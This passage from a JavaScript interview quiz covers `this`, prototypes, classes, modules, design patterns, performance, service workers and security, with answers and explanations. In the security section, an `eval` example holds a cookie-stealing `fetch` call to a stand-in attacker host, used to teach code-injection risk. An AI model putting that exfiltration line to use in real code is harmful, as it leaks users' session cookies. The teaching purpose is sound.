**Explanation:** After each macrotask (setTimeout callback), the engine processes **all pending microtasks** before picking the next macrotask. So after `"timeout 1"`, the microtask queue is drained (`"microtask inside timeout"`), then `"timeout 2"` runs.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. `this` Keyword — A developer uses `bind`, `call`, and `apply`. What are the outputs?

```javascript
function introduce(greeting, punctuation) {
  return `${greeting}, I'm ${this.name}${punctuation}`;
}

const person = { name: "Alice" };

console.log(introduce.call(person, "Hello", "!"));
console.log(introduce.apply(person, ["Hi", "?"]));

const bound = introduce.bind(person, "Hey");
console.log(bound("..."));
```

- A) `"Hello, I'm Alice!"`, `"Hi, I'm Alice?"`, `"Hey, I'm Alice..."`
- B) `"Hello, I'm undefined!"`, `"Hi, I'm undefined?"`, `"Hey, I'm undefined..."`
- C) `TypeError` on all three
- D) `"Hello, I'm Alice!"`, `"Hi, I'm Alice?"`, `TypeError`

**Answer: A) `"Hello, I'm Alice!"`, `"Hi, I'm Alice?"`, `"Hey, I'm Alice..."`**

**Explanation:** `.call(ctx, arg1, arg2)` invokes immediately with individual args. `.apply(ctx, [args])` invokes immediately with an array. `.bind(ctx, arg1)` returns a new function with `this` and first argument pre-filled (partial application).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 17. this Keyword 

<br>

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 18. Objects & Prototypes

<br>

## Q. A developer inspects the prototype chain. What does the following output?

```javascript
function Animal(name) {
  this.name = name;
}
Animal.prototype.speak = function() {
  return `${this.name} makes a noise.`;
};

const dog = new Animal("Rex");
console.log(dog.speak());
console.log(dog.hasOwnProperty("speak"));
console.log(dog.hasOwnProperty("name"));
```

- A) `"Rex makes a noise."`, `true`, `true`
- B) `"Rex makes a noise."`, `false`, `true`
- C) `"Rex makes a noise."`, `true`, `false`
- D) `undefined`, `false`, `true`

**Answer: B) `"Rex makes a noise."`, `false`, `true`**

**Explanation:** `speak` is on `Animal.prototype`, not on `dog` directly — so `hasOwnProperty("speak")` is `false`. `name` is set by the constructor on the instance itself — so `hasOwnProperty("name")` is `true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Object.create` produce?

```javascript
const base = {
  greet() { return `Hello, ${this.name}`; }
};

const child = Object.create(base);
child.name = "Bob";

console.log(child.greet());
console.log(Object.getPrototypeOf(child) === base);
```

- A) `TypeError`, `false`
- B) `"Hello, Bob"`, `true`
- C) `"Hello, undefined"`, `true`
- D) `"Hello, Bob"`, `false`

**Answer: B) `"Hello, Bob"`, `true`**

**Explanation:** `Object.create(base)` creates a new object whose prototype is `base`. The `greet` method is inherited via the prototype chain. `Object.getPrototypeOf(child) === base` confirms this.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 19. Functional Programming

<br>

## Q. A developer transforms user data. What does this output?

```javascript
const users = [
  { name: "Alice", age: 25, active: true },
  { name: "Bob", age: 17, active: false },
  { name: "Carol", age: 30, active: true }
];

const result = users
  .filter(u => u.active && u.age >= 18)
  .map(u => u.name.toUpperCase());

console.log(result);
```

- A) `["ALICE", "BOB", "CAROL"]`
- B) `["ALICE", "CAROL"]`
- C) `["Alice", "Carol"]`
- D) `["ALICE"]`

**Answer: B) `["ALICE", "CAROL"]`**

**Explanation:** `.filter()` keeps only users where `active === true` AND `age >= 18`: Alice (25, active) and Carol (30, active). Bob is excluded (not active and underage). `.map()` then uppercases the names.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses `reduce` to build an object. What is the output?

```javascript
const items = ["apple", "banana", "apple", "cherry", "banana", "apple"];

const count = items.reduce((acc, item) => {
  acc[item] = (acc[item] || 0) + 1;
  return acc;
}, {});

console.log(count.apple, count.banana, count.cherry);
```

- A) `3`, `2`, `1`
- B) `1`, `1`, `1`
- C) `3`, `3`, `3`
- D) `undefined`, `undefined`, `undefined`

**Answer: A) `3`, `2`, `1`**

**Explanation:** `reduce` accumulates a frequency map. `"apple"` appears 3 times, `"banana"` 2 times, `"cherry"` 1 time. Using `acc[item] || 0` safely initializes missing keys to `0` before incrementing.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 20. Classes

<br>

## Q. A developer uses class inheritance. What is the output?

```javascript
class Shape {
  constructor(color) {
    this.color = color;
  }
  describe() {
    return `A ${this.color} shape`;
  }
}

class Circle extends Shape {
  constructor(color, radius) {
    super(color);
    this.radius = radius;
  }
  describe() {
    return `${super.describe()} with radius ${this.radius}`;
  }
}

const c = new Circle("red", 5);
console.log(c.describe());
console.log(c instanceof Shape);
```

- A) `"A red shape with radius 5"`, `false`
- B) `"A red shape with radius 5"`, `true`
- C) `"A shape with radius 5"`, `true`
- D) `TypeError: Must call super constructor`

**Answer: B) `"A red shape with radius 5"`, `true`**

**Explanation:** `super(color)` must be called before accessing `this` in a derived class constructor. `super.describe()` calls the parent method. `instanceof` walks the prototype chain, and `Circle` extends `Shape`, so `c instanceof Shape` is `true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the static method example output?

```javascript
class MathHelper {
  static add(a, b) { return a + b; }
  multiply(a, b) { return a * b; }
}

const m = new MathHelper();
console.log(MathHelper.add(2, 3));
console.log(m.multiply(2, 3));
console.log(m.add(2, 3));
```

- A) `5`, `6`, `5`
- B) `5`, `6`, `TypeError: m.add is not a function`
- C) `TypeError`, `6`, `5`
- D) `5`, `TypeError`, `5`

**Answer: B) `5`, `6`, `TypeError: m.add is not a function`**

**Explanation:** Static methods belong to the class itself, not instances. `MathHelper.add()` works; `m.add()` throws `TypeError`. Instance methods like `multiply` are accessible on the instance.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 21. Modules

<br>

## Q. A project uses ES Modules. Which statement is correct about the following import?

```javascript
// math.js
export const PI = 3.14159;
export default function add(a, b) { return a + b; }
export function multiply(a, b) { return a * b; }

// app.js
import add, { PI, multiply } from "./math.js";
```

- A) This throws a `SyntaxError` — you cannot mix default and named imports
- B) `add` is the default export; `PI` and `multiply` are named exports — this is valid
- C) `add` will be `undefined` because default exports must use curly braces
- D) `multiply` must be imported before `PI`

**Answer: B) `add` is the default export; `PI` and `multiply` are named exports — this is valid**

**Explanation:** ES Modules allow one default export and multiple named exports per file. Default imports have no curly braces; named imports use `{ }`. Combining both in one import statement is perfectly valid.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## L4: Expert (Senior / Architect)

<br>

## # 22. Performance Optimization

<br>

## Q. A developer wants to prevent excessive API calls while typing in a search box. Which technique is correct?

```javascript
function debounce(fn, delay) {
  let timer;
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

const search = debounce((query) => console.log("Searching:", query), 300);
```

- A) This is throttling — it limits calls to one per interval
- B) This is debouncing — it waits for inactivity before calling the function
- C) This is memoization — it caches the result of the function
- D) This creates a memory leak because `timer` is never cleared

**Answer: B) This is debouncing — it waits for inactivity before calling the function**

**Explanation:** Debouncing delays function execution until after a period of inactivity. Each call resets the timer. Throttling would cap calls to a maximum frequency. Memoization caches results. `clearTimeout` prevents the memory leak.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer memoizes an expensive computation. What is the output and how many times is the heavy computation run?

```javascript
function memoize(fn) {
  const cache = new Map();
  return function(n) {
    if (cache.has(n)) return cache.get(n);
    const result = fn(n);
    cache.set(n, result);
    return result;
  };
}

let calls = 0;
const heavy = memoize((n) => { calls++; return n * n; });

console.log(heavy(4));
console.log(heavy(4));
console.log(heavy(5));
console.log("calls:", calls);
```

- A) `16`, `16`, `25`, `"calls: 3"`
- B) `16`, `16`, `25`, `"calls: 2"`
- C) `16`, `undefined`, `25`, `"calls: 2"`
- D) `16`, `16`, `25`, `"calls: 1"`

**Answer: B) `16`, `16`, `25`, `"calls: 2"`**

**Explanation:** First call `heavy(4)` — cache miss, computes `16`, stores it. Second call `heavy(4)` — cache hit, returns `16` without calling the function. `heavy(5)` — cache miss, computes `25`. Only 2 actual computations occur.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 23. Design Patterns

<br>

## Q. A developer implements a Singleton. Is the following a correct Singleton pattern?

```javascript
const Database = (() => {
  let instance;
  function createInstance() {
    return { connection: "db://localhost" };
  }
  return {
    getInstance() {
      if (!instance) instance = createInstance();
      return instance;
    }
  };
})();

const db1 = Database.getInstance();
const db2 = Database.getInstance();
console.log(db1 === db2);
```

- A) `false` — each `getInstance()` call creates a new object
- B) `true` — this correctly implements the Singleton pattern
- C) `TypeError` — `instance` is not accessible outside `createInstance`
- D) `false` — IIFE prevents Singleton behavior

**Answer: B) `true` — this correctly implements the Singleton pattern**

**Explanation:** The IIFE creates a private `instance` variable. `getInstance()` creates the instance only once (lazy initialization) and returns the same object on subsequent calls. `db1 === db2` is `true` because they reference the same object.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses the Observer/Pub-Sub pattern. What is logged when this runs?

```javascript
class EventEmitter {
  constructor() { this.events = {}; }
  on(event, listener) {
    (this.events[event] = this.events[event] || []).push(listener);
  }
  emit(event, data) {
    (this.events[event] || []).forEach(fn => fn(data));
  }
}

const emitter = new EventEmitter();
emitter.on("data", x => console.log("listener1:", x));
emitter.on("data", x => console.log("listener2:", x * 2));
emitter.emit("data", 5);
```

- A) `"listener1: 5"` only
- B) `"listener2: 10"` only
- C) `"listener1: 5"`, `"listener2: 10"`
- D) `TypeError: events[event] is not iterable`

**Answer: C) `"listener1: 5"`, `"listener2: 10"`**

**Explanation:** Both listeners are registered for `"data"`. When `emit("data", 5)` is called, all registered listeners execute with `data = 5`. This is the Publish-Subscribe pattern used extensively in Node.js\'s `EventEmitter`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer implements a Factory pattern. What does this return?

```javascript
function createShape(type, size) {
  const shapes = {
    circle: { type: "circle", area: () => Math.PI * size ** 2 },
    square: { type: "square", area: () => size ** 2 }
  };
  return shapes[type] || null;
}

const shape = createShape("square", 4);
console.log(shape.type);
console.log(shape.area());
```

- A) `"square"`, `8`
- B) `"square"`, `16`
- C) `null`, `TypeError`
- D) `"square"`, `Math.PI * 16`

**Answer: B) `"square"`, `16`**

**Explanation:** The Factory returns an object based on `type`. For `"square"` with `size = 4`, `area()` computes `4 ** 2 = 16`. The factory pattern decouples object creation from usage, making it easy to add new shapes.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 24. Security

<br>

## Q. A developer dynamically inserts user input into the DOM. Which code is vulnerable to XSS and what is the fix?

```javascript
// Vulnerable
function renderMessage(userInput) {
  document.getElementById("output").innerHTML = userInput;
}

// Fix — which is correct?
```

- A) Use `innerText` or `textContent` instead of `innerHTML`
- B) Wrap the input in `<script>` tags to sanitize it
- C) Encode the input using `encodeURIComponent`
- D) Use `JSON.stringify` on the input

**Answer: A) Use `innerText` or `textContent` instead of `innerHTML`**

**Explanation:** `innerHTML` parses the string as HTML, allowing injected `<script>` tags or event handlers (`<img onerror="...">`) to execute. `textContent`/`innerText` inserts the content as plain text, preventing HTML parsing and XSS attacks.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer stores a JWT token for authentication. Which storage method is most secure and why?

- A) `localStorage` — easy to access and persists across sessions
- B) `sessionStorage` — cleared when the tab closes, harder to steal
- C) An `HttpOnly` cookie — inaccessible to JavaScript, preventing XSS theft
- D) A global JavaScript variable — stays in memory, not persisted to disk

**Answer: C) An `HttpOnly` cookie — inaccessible to JavaScript, preventing XSS theft**

**Explanation:** `HttpOnly` cookies cannot be accessed via `document.cookie` or any JavaScript, making them immune to XSS token theft. `localStorage` and `sessionStorage` are readable by any script on the page. Pair `HttpOnly` with `SameSite=Strict` and `Secure` flags for CSRF protection.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer evaluates user-submitted code. What is the security risk?

```javascript
function calculate(expression) {
  return eval(expression);
}
console.log(calculate("2 + 2")); // 4
console.log(calculate("fetch('https://attacker.com?c=' + document.cookie)"));
```

- A) No risk — `eval` runs in a sandbox
- B) `eval` executes arbitrary code, enabling data exfiltration, XSS, and code injection
- C) The second call throws a `SyntaxError`
- D) `eval` is blocked by Content Security Policy automatically

**Answer: B) `eval` executes arbitrary code, enabling data exfiltration, XSS, and code injection**

**Explanation:** `eval` executes any JavaScript string with the same privileges as the page. An attacker can inject code to steal cookies, redirect users, or manipulate the DOM. Use `JSON.parse` for data or a math expression parser library instead of `eval`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 25. Browser Performance (Browser Internals)

<br>

## Q. A developer reads a DOM property inside a loop. What is the performance problem?

```javascript
// Slow
for (let i = 0; i < 1000; i++) {
  document.getElementById("box").style.width = i + "px";
  console.log(document.getElementById("box").offsetWidth); // forces reflow
}
```

- A) `getElementById` is not safe inside loops
- B) Reading `offsetWidth` inside the write loop forces synchronous reflow (layout thrashing)
- C) `style.width` should use `classList` instead
- D) `console.log` is the performance bottleneck

**Answer: B) Reading `offsetWidth` inside the write loop forces synchronous reflow (layout thrashing)**

**Explanation:** Writing styles (invalidates layout) and then reading layout properties (`offsetWidth`, `getBoundingClientRect`) forces the browser to synchronously recalculate layout. The fix is to batch reads together and writes together, or use `requestAnimationFrame`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What triggers a repaint vs. a reflow?

- A) Changing `color` or `background` triggers reflow; changing `width` triggers repaint
- B) Changing geometric properties (`width`, `height`, `margin`) triggers reflow; changing visual properties (`color`, `background`) triggers repaint only
- C) Both reflow and repaint are the same operation
- D) Reflow only happens on page load; repaint happens on every DOM change

**Answer: B) Changing geometric properties (`width`, `height`, `margin`) triggers reflow; changing visual properties (`color`, `background`) triggers repaint only**

**Explanation:** A **reflow** (layout) recalculates element positions and sizes — it is expensive. A **repaint** just redraws pixels for visual changes without affecting layout — cheaper. Reflows always trigger a repaint, but not vice versa. Use CSS `transform` and `opacity` for animations as they can be composited on the GPU without triggering reflow.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 26. Progressive Web Apps (PWA)

<br>

## Q. A developer registers a Service Worker. What does the following do?

```javascript
if ("serviceWorker" in navigator) {
  navigator.serviceWorker.register("/sw.js")
    .then(reg => console.log("SW registered:", reg.scope))
    .catch(err => console.log("SW failed:", err));
}
```

- A) Registers a Web Worker for parallel computation
- B) Registers a Service Worker that can intercept network requests and cache assets
- C) Enables push notifications without user permission
- D) Creates a shared worker accessible across all browser tabs

**Answer: B) Registers a Service Worker that can intercept network requests and cache assets**

**Explanation:** A Service Worker is a script that runs in the background, separate from the web page. It acts as a proxy for network requests, enabling offline support via caching strategies (Cache-First, Network-First, etc.), background sync, and push notifications.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer implements a Cache-First caching strategy. What does this mean?

```javascript
self.addEventListener("fetch", event => {
  event.respondWith(
    caches.match(event.request).then(cached => {
      return cached || fetch(event.request);
    })
  );
});
```

- A) Always fetches from the network; never uses the cache
- B) Returns cached response if available; falls back to network if not cached
- C) Always uses the network and updates the cache in the background
- D) Only caches POST requests

**Answer: B) Returns cached response if available; falls back to network if not cached**

**Explanation:** Cache-First prioritizes the cache for speed, making the app work offline or in low-network conditions. If the resource is not cached, it fetches from the network. Contrast with Network-First (tries network, falls back to cache) for frequently updated content.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 27. Real-World Problem Solving

<br>

## Q. A developer needs to deep clone an object without using a library. Which approach is correct and safe for JSON-serializable data?

```javascript
const original = { a: 1, b: { c: 2 }, d: [3, 4] };

// Option A
const clone1 = Object.assign({}, original);

// Option B
const clone2 = JSON.parse(JSON.stringify(original));

// Option C
const clone3 = { ...original };
```

- A) Option A — `Object.assign` deep clones all nested objects
- B) Option B — `JSON.parse(JSON.stringify(...))` creates a true deep clone for JSON-safe data
- C) Option C — spread operator deep clones arrays and objects
- D) All three produce identical deep clones

**Answer: B) Option B — `JSON.parse(JSON.stringify(...))` creates a true deep clone for JSON-safe data**

**Explanation:** Both `Object.assign` and spread `{...}` perform **shallow copies** — nested objects still share references. `JSON.parse(JSON.stringify())` creates a true deep clone but loses `undefined`, `Date` objects, `functions`, and circular references. For production, use `structuredClone()` (modern) or a library like Lodash\'s `_.cloneDeep`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer debugging a memory leak identifies that event listeners are not removed. Which pattern correctly prevents this?

```javascript
class Component {
  constructor() {
    this.handleClick = this.handleClick.bind(this);
    document.addEventListener("click", this.handleClick);
  }
  handleClick(e) { console.log("clicked"); }
  destroy() {
    document.removeEventListener("click", this.handleClick);
  }
}
```

- A) This pattern is wrong — you cannot store bound functions
- B) This correctly allows removal because the same function reference is stored
- C) `removeEventListener` requires passing a new function reference
- D) This creates a new listener every time `destroy()` is called

**Answer: B) This correctly allows removal because the same function reference is stored**

**Explanation:** `removeEventListener` requires the **exact same function reference** used in `addEventListener`. By storing `this.handleClick = this.handleClick.bind(this)` in the constructor, the same reference is used for both adding and removing. Anonymous functions or inline `bind()` calls in `addEventListener` cannot be removed.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer implements `flatDeep` — a function that flattens a deeply nested array. What does the following return?

```javascript
const nested = [1, [2, [3, [4, [5]]]]];

console.log(nested.flat(Infinity));
console.log(nested.flat(1));
console.log(nested.flat(2));
```

- A) `[1,2,3,4,5]`, `[1,2,[3,[4,[5]]]]`, `[1,2,3,[4,[5]]]`
- B) `[1,2,3,4,5]`, `[1,[2,[3,[4,[5]]]]]`, `[1,2,3,4,5]`
- C) `[1,2,3,4,5]`, `[1,2,3,4,5]`, `[1,2,3,4,5]`
- D) `TypeError: flat is not a function`

**Answer: A) `[1,2,3,4,5]`, `[1,2,[3,[4,[5]]]]`, `[1,2,3,[4,[5]]]`**

**Explanation:** `.flat(depth)` flattens the array by the specified depth. `Infinity` flattens completely. `flat(1)` removes one level of nesting. `flat(2)` removes two levels. This is an ES2019 built-in method.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer needs to implement a function that groups array items by a key. What is the output?

```javascript
const people = [
  { name: "Alice", dept: "Engineering" },
  { name: "Bob", dept: "Marketing" },
  { name: "Carol", dept: "Engineering" }
];

const grouped = Object.groupBy(people, p => p.dept);
console.log(grouped["Engineering"].length);
console.log(grouped["Marketing"][0].name);
```

- A) `2`, `"Bob"`
- B) `1`, `"Bob"`
- C) `3`, `"Alice"`
- D) `TypeError: Object.groupBy is not a function` in all browsers

**Answer: A) `2`, `"Bob"`**

**Explanation:** `Object.groupBy()` (ES2024) groups array items into an object by the return value of the callback. `"Engineering"` gets Alice and Carol (length `2`); `"Marketing"` gets Bob. Use `.reduce()` as a polyfill for older environments.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>
